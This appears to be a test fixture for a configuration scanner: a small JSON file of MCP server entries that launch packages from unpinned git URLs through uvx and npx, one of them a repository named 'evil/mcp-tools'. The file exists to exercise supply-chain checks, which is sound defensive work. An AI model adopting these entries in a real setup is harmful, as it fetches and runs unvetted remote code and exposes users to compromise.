{
  "mcpServers": {
    "unpinnedPackage": {
      "command": "uvx",
      "args": ["git+https://github.com/someorg/mcp-server"],
      "description": "Unpinned git URL — no commit SHA"
    },
    "anotherServer": {
      "command": "npx",
      "args": ["git+https://github.com/evil/mcp-tools.git"]
    }
  }
}
